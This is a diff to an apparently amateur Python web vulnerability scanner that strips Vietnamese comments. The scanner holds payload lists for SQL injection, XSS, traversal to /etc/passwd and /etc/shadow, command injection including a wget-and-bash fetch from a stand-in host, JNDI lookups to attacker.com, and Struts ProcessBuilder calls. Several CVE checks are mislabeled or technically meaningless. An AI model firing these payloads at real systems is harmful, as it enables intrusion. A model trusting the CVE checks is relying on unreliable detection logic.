@@ -11,7 +11,6 @@ from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import urljoin
 from urllib.parse import urlparse, quote
 
-# Cấu hình log
 logging.basicConfig(
     filename="sql_injection_check.log",
     filemode="a",
@@ -19,7 +18,7 @@ logging.basicConfig(
     level=logging.INFO,
 )
 
-# SQL Injection Check Function
+# SQL inj
 def check_sql_injection(url):
     print("\n[+] Checking for SQL Injection...")
     payloads = [
@@ -51,7 +50,6 @@ def check_sql_injection(url):
             print(f"  [!] Error testing payload {payload}: {e}")
             logging.error(f"Error testing payload {payload}: {e}")
 
-    # Kiểm tra song song các payloads
     with ThreadPoolExecutor(max_workers=5) as executor:
         executor.map(test_payload, payloads)
 
@@ -60,7 +58,6 @@ def check_sql_injection(url):
         logging.info("No SQL Injection vulnerabilities found.")
 
 
-# Cấu hình log
 logging.basicConfig(
     filename="xss_check.log",
     filemode="a",
@@ -68,7 +65,7 @@ logging.basicConfig(
     level=logging.INFO,
 )
 
-# XSS Check Function
+#XSS 
 def check_xss(url):
     print("\n[+] Checking for Cross-Site Scripting (XSS)...")
     payloads = [
@@ -92,7 +89,6 @@ def check_xss(url):
                 logging.warning(f"Vulnerable payload: {payload} - Response: {response.text[:100]}")
                 vulnerable = True
             else:
-                # Kiểm tra xem payload đã bị mã hóa hay chưa (giảm false negative)
                 encoded_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
                 if encoded_payload in response.text:
                     print(f"  [-] Potential encoded XSS vulnerability with payload: {payload}")
@@ -102,7 +98,6 @@ def check_xss(url):
             print(f"  [!] Error testing payload {payload}: {e}")
             logging.error(f"Error testing payload {payload}: {e}")
 
-    # Kiểm tra song song các payloads
     with ThreadPoolExecutor(max_workers=5) as executor:
         executor.map(test_payload, payloads)
 
@@ -110,8 +105,6 @@ def check_xss(url):
         print("  [+] No XSS vulnerabilities found.")
         logging.info("No XSS vulnerabilities found.")
 
-
-# Cấu hình log
 logging.basicConfig(
     filename="command_injection_check.log",
     filemode="a",
@@ -119,7 +112,7 @@ logging.basicConfig(
     level=logging.INFO,
 )
 
-# Command Injection Check Function
+# CMD Injection 
 def check_command_injection(url):
     print("\n[+] Checking for Command Injection...")
     payloads = [
@@ -140,13 +133,13 @@ def check_command_injection(url):
     def test_payload(payload):
         nonlocal vulnerable
         try:
-            # Kiểm tra bằng phương thức GET
+            #GET
             response = requests.get(url, params={"cmd": payload}, headers=headers, cookies=cookies)
             if "root" in response.text or "bin" in response.text or "uid" in response.text:
                 print(f"  [-] Potential Command Injection vulnerability with payload: {payload}")
                 logging.warning(f"Vulnerable payload: {payload} - Response: {response.text[:100]}")
                 vulnerable = True
-            # Kiểm tra thêm với phương thức POST
+            #POST
             response_post = requests.post(url, data={"cmd": payload}, headers=headers, cookies=cookies)
             if "root" in response_post.text or "bin" in response_post.text or "uid" in response_post.text:
                 print(f"  [-] Potential Command Injection vulnerability (POST) with payload: {payload}")
@@ -156,7 +149,6 @@ def check_command_injection(url):
             print(f"  [!] Error testing payload {payload}: {e}")
             logging.error(f"Error testing payload {payload}: {e}")
 
-    # Kiểm tra song song các payloads
     with ThreadPoolExecutor(max_workers=5) as executor:
         executor.map(test_payload, payloads)
 
@@ -164,8 +156,6 @@ def check_command_injection(url):
         print("  [+] No Command Injection vulnerabilities found.")
         logging.info("No Command Injection vulnerabilities found.")
         
-
-# Cấu hình log
 logging.basicConfig(
     filename="directory_traversal_check.log",
     filemode="a",
@@ -173,7 +163,7 @@ logging.basicConfig(
     level=logging.INFO,
 )
 
-# Directory Traversal Check Function
+# Directory Traversal (DT)
 def check_directory_traversal(url):
     print("\n[+] Checking for Directory Traversal...")
     payloads = [
@@ -181,12 +171,12 @@ def check_directory_traversal(url):
         "../../../../windows/system32/drivers/etc/hosts",
         "../../../../var/www/html/index.php",
         "../../../..//..//..//..//etc/passwd",
-        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  
         "../../../etc/hosts",
-        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
+        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  
         "../../../../..//..//..//..//etc/shadow",
-        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",  # Traversal with encoding
-        "../../../../..//..//..//..//windows/system32/drivers/etc/hosts",  # Windows path
+        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",  
+        "../../../../..//..//..//..//windows/system32/drivers/etc/hosts",  
     ]
     headers = {"User-Agent": "DirectoryTraversalTester/1.0"}
     cookies = {"session": "test_payload"}
@@ -195,13 +185,13 @@ def check_directory_traversal(url):
     def test_payload(payload):
         nonlocal vulnerable
         try:
-            # Kiểm tra với phương thức GET
+            # GET
             response = requests.get(url, params={"file": payload}, headers=headers, cookies=cookies)
             if "root:x" in response.text or "127.0.0.1" in response.text or "etc/passwd" in response.text:
                 print(f"  [-] Potential Directory Traversal vulnerability with payload: {payload}")
                 logging.warning(f"Vulnerable payload: {payload} - Response: {response.text[:100]}")
                 vulnerable = True
-            # Kiểm tra thêm với phương thức POST
+            # POST
             response_post = requests.post(url, data={"file": payload}, headers=headers, cookies=cookies)
             if "root:x" in response_post.text or "127.0.0.1" in response_post.text or "etc/passwd" in response_post.text:
                 print(f"  [-] Potential Directory Traversal vulnerability (POST) with payload: {payload}")
@@ -211,7 +201,6 @@ def check_directory_traversal(url):
             print(f"  [!] Error testing payload {payload}: {e}")
             logging.error(f"Error testing payload {payload}: {e}")
 
-    # Kiểm tra song song các payloads
     with ThreadPoolExecutor(max_workers=5) as executor:
         executor.map(test_payload, payloads)
 
@@ -220,7 +209,6 @@ def check_directory_traversal(url):
         logging.info("No Directory Traversal vulnerabilities found.")
 
 
-# Cấu hình log
 logging.basicConfig(
     filename="rce_check.log",
     filemode="a",
@@ -228,7 +216,7 @@ logging.basicConfig(
     level=logging.INFO,
 )
 
-# Remote Code Execution (RCE) Check Function
+# RCE 
 def check_remote_code_execution(url):
     print("\n[+] Checking for Remote Code Execution (RCE)...")
     payloads = [
@@ -241,8 +229,8 @@ def check_remote_code_execution(url):
         "; ps aux",
         "&& netstat -tuln",
         "; cat /etc/hostname",
-        "&& wget http://example.com/malicious.sh -O /tmp/malicious.sh && bash /tmp/malicious.sh",  # Payloads nguy hiểm hơn
-        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
+        "&& wget http://example.com/malicious.sh -O /tmp/malicious.sh && bash /tmp/malicious.sh",  
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  
     ]
     headers = {"User-Agent": "RCECheckTool/1.0"}
     cookies = {"session": "test_payload"}
@@ -251,13 +239,13 @@ def check_remote_code_execution(url):
     def test_payload(payload):
         nonlocal vulnerable
         try:
-            # Kiểm tra với phương thức GET
+            # GET
             response = requests.get(url, params={"cmd": payload}, headers=headers, cookies=cookies)
             if "root" in response.text or "bin" in response.text or "uid" in response.text:
                 print(f"  [-] Potential RCE vulnerability with payload: {payload}")
                 logging.warning(f"Vulnerable payload (GET): {payload} - Response: {response.text[:100]}")
                 vulnerable = True
-            # Kiểm tra thêm với phương thức POST
+            # POST
             response_post = requests.post(url, data={"cmd": payload}, headers=headers, cookies=cookies)
             if "root" in response_post.text or "bin" in response_post.text or "uid" in response_post.text:
                 print(f"  [-] Potential RCE vulnerability (POST) with payload: {payload}")
@@ -267,7 +255,6 @@ def check_remote_code_execution(url):
             print(f"  [!] Error testing payload {payload}: {e}")
             logging.error(f"Error testing payload {payload}: {e}")
 
-    # Kiểm tra song song các payloads
     with ThreadPoolExecutor(max_workers=5) as executor:
         executor.map(test_payload, payloads)
 
@@ -276,9 +263,6 @@ def check_remote_code_execution(url):
         logging.info("No RCE vulnerabilities found.")
 
 
-# Check for known CVE
-
-# Cấu hình log
 logging.basicConfig(
     filename="log4shell_check.log",
     filemode="a",
@@ -286,11 +270,11 @@ logging.basicConfig(
     level=logging.INFO,
 )
 
-# Log4Shell (CVE-2021-44228) Check Function
+# Log4Shell 
 def check_log4shell(url):
     print("\n[+] Checking for CVE-2021-44228 (Log4Shell)...")
 
-    # Các payload khác nhau để kiểm tra lỗ hổng Log4Shell
+    # ploads
     payloads = [
         "${jndi:ldap://example.com/a}",
         "${jndi:rmi://example.com/a}",
@@ -300,28 +284,27 @@ def check_log4shell(url):
         "${jndi:ldap://attacker.com:1389/a}",
     ]
 
-    # Địa chỉ của máy chủ lừa đảo (server giả mạo)
-    attack_server = "example.com"  # Thay thế bằng URL của server bạn muốn theo dõi
+    attack_server = "example.com" 
 
-    headers = {"User-Agent": payloads[0]}  # Chạy lần kiểm tra đầu tiên với payload đầu tiên
+    headers = {"User-Agent": payloads[0]}
     timeout = 5
-    retries = 3  # Số lần thử lại nếu có lỗi
+    retries = 3 
 
     vulnerable = False
 
     for payload in payloads:
-        headers["User-Agent"] = payload  # Cập nhật payload trong headers
+        headers["User-Agent"] = payload 
 
-        for _ in range(retries):  # Thử lại nhiều lần
+        for _ in range(retries):
             try:
                 response = requests.get(url, headers=headers, timeout=timeout)
-                # Kiểm tra mã trạng thái và phản hồi
+                
                 if response.status_code == 200:
                     if attack_server in response.text:
                         print(f"  [-] Potential vulnerability to Log4Shell detected with payload: {payload}")
                         logging.warning(f"Vulnerable payload: {payload} - Response: {response.text[:100]}")
                         vulnerable = True
-                        break  # Dừng kiểm tra nếu đã phát hiện lỗ hổng
+                        break  
                 else:
                     print(f"  [+] No vulnerability found with payload: {payload}")
             except requests.RequestException as e:
@@ -334,7 +317,6 @@ def check_log4shell(url):
         logging.info("No Log4Shell vulnerability found.")
 
 
-# Cấu hình log
 logging.basicConfig(
     filename="smbghost_check.log",
     filemode="a",
@@ -342,21 +324,21 @@ logging.basicConfig(
     level=logging.INFO,
 )
 
-# SMBGhost (CVE-2020-0796) Check Function
+#CVE-2020-0796
 def check_smbghost(url):
     print("\n[+] Checking for CVE-2020-0796 (SMBGhost)...")
 
-    # Các payloads khác nhau để kiểm tra khả năng bị khai thác
+    
     payloads = [
-        "smb",  # Kiểm tra từ khóa 'smb'
-        "SMB",  # Kiểm tra với chữ hoa
-        "SMBGhost",  # Kiểm tra tên lỗ hổng
-        "smb://",  # Kiểm tra chuỗi URL SMB
-        "smbc://",  # Một số variants của SMB
-        "smb://example.com",  # Ví dụ kết nối SMB
+        "smb",  
+        "SMB",  
+        "SMBGhost",  
+        "smb://",  
+        "smbc://",  
+        "smb://example.com",  
     ]
 
-    # Các headers cần thử nghiệm
+   
     headers_list = [
         {"User-Agent": "Mozilla/5.0"},
         {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
@@ -364,22 +346,21 @@ def check_smbghost(url):
         {"Accept": "application/json"},
     ]
 
-    timeout = 5  # Thời gian timeout cho mỗi request
-    retries = 3  # Thử lại 3 lần nếu có lỗi
+    timeout = 5  
+    retries = 3  
 
     vulnerable = False
 
     for payload in payloads:
         for headers in headers_list:
-            for _ in range(retries):  # Thử lại nếu có lỗi
+            for _ in range(retries):  
                 try:
                     response = requests.get(url, headers=headers, params={"q": payload}, timeout=timeout)
-                    # Kiểm tra nếu có sự xuất hiện của các từ khóa liên quan đến SMB
                     if response.status_code == 200 and (payload.lower() in response.text.lower()):
                         print(f"  [-] Potential vulnerability to SMBGhost detected with payload: {payload}")
                         logging.warning(f"Vulnerable payload: {payload} - Headers: {headers} - Response: {response.text[:100]}")
                         vulnerable = True
-                        break  # Dừng kiểm tra nếu đã phát hiện lỗ hổng
+                        break 
                 except requests.RequestException as e:
                     print(f"  [!] Error testing payload {payload} with headers {headers}: {e}")
                     logging.error(f"Error testing payload {payload} with headers {headers}: {e}")
@@ -398,20 +379,19 @@ logging.basicConfig(
     level=logging.INFO,
 )
 
-# Apache Struts RCE (CVE-2017-5638) Check Function
+#CVE-2017-5638 
 def check_apache_struts_rce(url):
     print("\n[+] Checking for CVE-2017-5638 (Apache Struts RCE)...")
 
-    # Các payloads khác nhau để kiểm tra RCE
+    # RCE
     payloads = [
-        {"action": "${${}}"},  # EL injection payload cơ bản
+        {"action": "${${}}"},  
         {"action": "${(new java.lang.ProcessBuilder('id')).start()}"},
         {"action": "${(new java.lang.ProcessBuilder('ls')).start()}"},
         {"action": "${(new java.lang.ProcessBuilder('echo vulnerable')).start()}"},
         {"action": "${(new java.net.URL('http://example.com')).openStream()}"},
     ]
 
-    # Các headers cần thử nghiệm
     headers_list = [
         {"User-Agent": "Mozilla/5.0"},
         {"Content-Type": "application/x-www-form-urlencoded"},
@@ -419,23 +399,21 @@ def check_apache_struts_rce(url):
         {"Accept": "application/json"},
     ]
 
-    timeout = 5  # Thời gian timeout cho mỗi request
-    retries = 3  # Thử lại tối đa 3 lần nếu có lỗi
-
+    timeout = 5  
+    retries = 3  
     vulnerable = False
 
     for payload in payloads:
         for headers in headers_list:
-            for _ in range(retries):  # Thử lại nếu có lỗi
+            for _ in range(retries):  
                 try:
                     response = requests.post(url, data=payload, headers=headers, timeout=timeout)
 
-                    # Kiểm tra mã trạng thái và nội dung phản hồi
                     if response.status_code == 500 or "struts" in response.text.lower() or "vulnerable" in response.text.lower():
                         print(f"  [-] Potential vulnerability to Apache Struts RCE detected with payload: {payload}")
                         logging.warning(f"Vulnerable payload: {payload} - Headers: {headers} - Response: {response.text[:100]}")
                         vulnerable = True
-                        break  # Dừng kiểm tra nếu đã phát hiện lỗ hổng
+                        break  
 
                 except requests.RequestException as e:
                     print(f"  [!] Error testing payload {payload} with headers {headers}: {e}")
@@ -447,7 +425,6 @@ def check_apache_struts_rce(url):
         logging.info("No Apache Struts RCE vulnerability found.")
 
 
-# Cấu hình log
 logging.basicConfig(
     filename="printnightmare_check.log",
     filemode="a",
@@ -455,20 +432,18 @@ logging.basicConfig(
     level=logging.INFO,
 )
 
-# PrintNightmare (CVE-2021-34527) Check Function
+# CVE-2021-34527 
 def check_printnightmare(url):
     print("\n[+] Checking for CVE-2021-34527 (PrintNightmare)...")
 
-    # Các payloads khác nhau để kiểm tra PrintNightmare
     payloads = [
         {"data": "test"},
         {"data": "exploit"},
         {"data": "${jndi:ldap://example.com/a}"},
-        {"data": "file:///etc/passwd"},  # Kiểm tra payload thử nghiệm file
-        {"data": "%%${print:EXTERNAL}"},  # Một payload với từ khóa
+        {"data": "file:///etc/passwd"},  
+        {"data": "%%${print:EXTERNAL}"},  
     ]
 
-    # Các headers cần thử nghiệm
     headers_list = [
         {"User-Agent": "Mozilla/5.0"},
         {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
@@ -477,26 +452,23 @@ def check_printnightmare(url):
         {"Accept-Encoding": "gzip, deflate"},
     ]
 
-    timeout = 5  # Thời gian timeout cho mỗi request
-    retries = 3  # Thử lại tối đa 3 lần nếu có lỗi
-
+    timeout = 5  
+    retries = 3  
     vulnerable = False
 
     for payload in payloads:
         for headers in headers_list:
-            for _ in range(retries):  # Thử lại nếu có lỗi
+            for _ in range(retries):  
                 try:
-                    # Mã hóa payload nếu cần thiết (URL encoding)
                     encoded_payload = {key: quote(value) for key, value in payload.items()}
                     
                     response = requests.get(url, params=encoded_payload, headers=headers, timeout=timeout)
 
-                    # Kiểm tra mã trạng thái và nội dung phản hồi
                     if response.status_code == 200 and ("exploit" in response.text.lower() or "error" in response.text.lower()):
                         print(f"  [-] Potential PrintNightmare vulnerability detected with payload: {payload}")
                         logging.warning(f"Vulnerable payload: {payload} - Headers: {headers} - Response: {response.text[:100]}")
                         vulnerable = True
-                        break  # Dừng kiểm tra nếu đã phát hiện lỗ hổng
+                        break  
 
                 except requests.RequestException as e:
                     print(f"  [!] Error testing payload {payload} with headers {headers}: {e}")
@@ -508,7 +480,7 @@ def check_printnightmare(url):
         logging.info("No PrintNightmare vulnerability found.")
 
 
-# Cấu hình log
+
 logging.basicConfig(
     filename="spring4shell_check.log",
     filemode="a",
@@ -516,20 +488,16 @@ logging.basicConfig(
     level=logging.INFO,
 )
 
-# Spring4Shell (CVE-2022-22965) Check Function
+# CVE-2022-22965
 def check_spring4shell(url):
     print("\n[+] Checking for CVE-2022-22965 (Spring4Shell)...")
-
-    # Các payloads khác nhau để kiểm tra Spring4Shell
     payloads = [
         {"springframework": "test"},
         {"springframework": "${jndi:ldap://example.com/a}"},
-        {"springframework": "file:///etc/passwd"},  # Thử khai thác với đường dẫn file
-        {"springframework": "<script>alert('XSS')</script>"},  # Thử với mã độc XSS
-        {"springframework": "${${}}"}  # Một số payload khác thử nghiệm
+        {"springframework": "file:///etc/passwd"}, 
+        {"springframework": "<script>alert('XSS')</script>"},  
+        {"springframework": "${${}}"}  
     ]
-
-    # Các headers cần thử nghiệm
     headers_list = [
         {"User-Agent": "Mozilla/5.0"},
         {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
@@ -538,26 +506,26 @@ def check_spring4shell(url):
         {"Accept-Encoding": "gzip, deflate"},
     ]
 
-    timeout = 5  # Thời gian timeout cho mỗi request
-    retries = 3  # Thử lại tối đa 3 lần nếu có lỗi
+    timeout = 5  
+    retries = 3  
 
     vulnerable = False
 
     for payload in payloads:
         for headers in headers_list:
-            for _ in range(retries):  # Thử lại nếu có lỗi
+            for _ in range(retries):  
                 try:
-                    # Mã hóa payload nếu cần thiết (URL encoding)
+                    
                     encoded_payload = {key: quote(value) for key, value in payload.items()}
                     
                     response = requests.post(url, data=encoded_payload, headers=headers, timeout=timeout)
 
-                    # Kiểm tra mã trạng thái và nội dung phản hồi
+                    
                     if response.status_code == 200 and ("error" in response.text.lower() or "exception" in response.text.lower()):
                         print(f"  [-] Potential Spring4Shell vulnerability detected with payload: {payload}")
                         logging.warning(f"Vulnerable payload: {payload} - Headers: {headers} - Response: {response.text[:100]}")
                         vulnerable = True
-                        break  # Dừng kiểm tra nếu đã phát hiện lỗ hổng
+                        break 
 
                 except requests.RequestException as e:
                     print(f"  [!] Error testing payload {payload} with headers {headers}: {e}")
@@ -569,7 +537,7 @@ def check_spring4shell(url):
         logging.info("No Spring4Shell vulnerability found.")
 
 
-# Cấu hình log
+
 logging.basicConfig(
     filename="cve_2023_23397_check.log",
     filemode="a",
@@ -577,11 +545,9 @@ logging.basicConfig(
     level=logging.INFO,
 )
 
-# CVE-2023-23397 Check Function (Microsoft Outlook Elevation of Privilege)
+# CVE-2023-23397 
 def check_cve_2023_23397(url):
     print("\n[+] Checking for CVE-2023-23397 (Microsoft Outlook Elevation of Privilege)...")
-
-    # Payloads khác nhau để kiểm tra lỗ hổng CVE-2023-23397
     payloads = [
         {"User-Agent": "Outlook/Exchange Exploit"},
         {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Outlook/Exchange Exploit"},
@@ -590,22 +556,19 @@ def check_cve_2023_23397(url):
         {"Referer": "http://malicious.com"}
     ]
     
-    timeout = 5  # Thời gian timeout cho mỗi request
-    retries = 3  # Thử lại tối đa 3 lần nếu có lỗi
+    timeout = 5  
+    retries = 3  
     vulnerable = False
 
     for payload in payloads:
-        for _ in range(retries):  # Thử lại nếu có lỗi
+        for _ in range(retries):  
             try:
-                # Gửi yêu cầu GET với các header payload
                 response = requests.get(url, headers=payload, timeout=timeout)
-
-                # Kiểm tra mã trạng thái và nội dung phản hồi
                 if response.status_code == 200:
                     print(f"  [-] Potential CVE-2023-23397 vulnerability detected with headers: {payload}")
                     logging.warning(f"Vulnerable headers: {payload} - Response: {response.text[:100]}")
                     vulnerable = True
-                    break  # Dừng kiểm tra nếu đã phát hiện lỗ hổng
+                    break  
 
             except requests.RequestException as e:
                 print(f"  [!] Error testing payload {payload}: {e}")
@@ -617,7 +580,7 @@ def check_cve_2023_23397(url):
         logging.info("No CVE-2023-23397 vulnerability found.")
 
 
-# Cấu hình log
+
 logging.basicConfig(
     filename="cve_2023_3519_check.log",
     filemode="a",
@@ -625,11 +588,9 @@ logging.basicConfig(
     level=logging.INFO,
 )
 
-# CVE-2023-3519 Check Function (Cisco ISE RCE)
+#CVE-2023-3519 
 def check_cve_2023_3519(url):
     print("\n[+] Checking for CVE-2023-3519 (Cisco ISE RCE)...")
-
-    # Các payload khác nhau để kiểm tra CVE-2023-3519
     payloads = [
         {"username": "test", "password": "test"},
         {"username": "admin", "password": "admin"},
@@ -638,30 +599,26 @@ def check_cve_2023_3519(url):
         {"username": "${jndi:ldap://malicious.com/a}", "password": "test"}
     ]
     
-    # Các headers khác nhau để kiểm tra
     headers_list = [
         {"User-Agent": "CiscoISEExploit/1.0"},
         {"X-Forwarded-For": "127.0.0.1"},
-        {"Authorization": "Basic YWRtaW46YWRtaW4="}  # Base64 encoded "admin:admin"
+        {"Authorization": "Basic YWRtaW46YWRtaW4="} 
     ]
 
-    timeout = 5  # Thời gian timeout cho mỗi request
-    retries = 3  # Thử lại tối đa 3 lần nếu có lỗi
+    timeout = 5 
+    retries = 3  
     vulnerable = False
 
     for payload in payloads:
         for headers in headers_list:
-            for _ in range(retries):  # Thử lại nếu có lỗi
+            for _ in range(retries): 
                 try:
-                    # Gửi yêu cầu POST với form data payload
                     response = requests.post(url, data=payload, headers=headers, timeout=timeout)
-
-                    # Kiểm tra mã trạng thái và nội dung phản hồi
                     if response.status_code == 200 and "exec" in response.text:
                         print(f"  [-] Potential CVE-2023-3519 vulnerability detected with payload: {payload} and headers: {headers}")
                         logging.warning(f"Vulnerable payload: {payload} - headers: {headers} - Response: {response.text[:100]}")
                         vulnerable = True
-                        break  # Dừng kiểm tra nếu đã phát hiện lỗ hổng
+                        break  
 
                 except requests.RequestException as e:
                     print(f"  [!] Error testing payload {payload} with headers {headers}: {e}")
@@ -673,18 +630,16 @@ def check_cve_2023_3519(url):
         logging.info("No CVE-2023-3519 vulnerability found.")
 
 
-# Hàm quét website
+# website
 def scan_website(url):
     print(f"\n[+] Starting website vulnerability scan for: {url}\n")
 
-    # Kiểm tra các lỗ hổng bảo mật phổ biến
     check_sql_injection(url)
     check_xss(url)
     check_command_injection(url)
     check_directory_traversal(url)
     check_remote_code_execution(url)
     
-    # Kiểm tra các CVE nổi tiếng
     check_log4shell(url)
     check_smbghost(url)
     check_apache_struts_rce(url)
